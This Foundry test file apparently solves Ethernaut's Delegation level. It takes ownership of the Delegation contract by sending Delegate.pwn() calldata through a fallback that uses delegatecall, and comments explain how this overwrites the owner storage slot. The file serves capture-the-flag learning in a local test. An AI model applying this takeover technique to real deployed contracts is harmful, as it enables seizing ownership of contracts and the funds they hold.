// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../../src/ethernaut/06.sol";

contract DelegationTest is Test {
    Delegate public delegateContract;
    Delegation public delegationContract;

    function setUp() public {
        delegateContract = new Delegate(address(this));
        delegationContract = new Delegation(address(delegateContract));
    }

    function testHack() public {
        console.log("Delegation owner before: ", delegationContract.owner());

        // Send calldata for Delegate.pwn() directly to Delegation.
        // The fallback uses delegatecall so pwn() will run in Delegation's
        // storage context and overwrite its owner slot.
        vm.prank(address(1));
        (bool ok,) = address(delegationContract).call(abi.encodeWithSelector(Delegate.pwn.selector));
        require(ok, "delegatecall failed");

        console.log("Delegation owner after: ", delegationContract.owner());
        assertEq(delegationContract.owner(), address(1));
    }
}
